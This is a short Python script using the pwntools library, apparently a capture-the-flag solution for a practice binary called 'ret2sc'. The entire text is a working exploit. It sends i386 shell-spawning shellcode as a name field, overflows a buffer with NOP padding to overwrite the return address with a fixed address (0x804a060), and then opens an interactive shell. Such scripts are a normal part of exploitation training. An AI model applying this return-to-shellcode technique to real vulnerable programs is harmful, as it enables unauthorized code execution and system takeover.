import pwn

with pwn.context.local(log_level='critical'):
    p = pwn.process('ret2sc')
    p.sendlineafter('Name:', pwn.asm(
        pwn.shellcraft.i386.sh()
    ))
    p.sendlineafter('best:', pwn.p32(0x804a060).rjust(0x1c + 8, b'\x90'))
    p.interactive()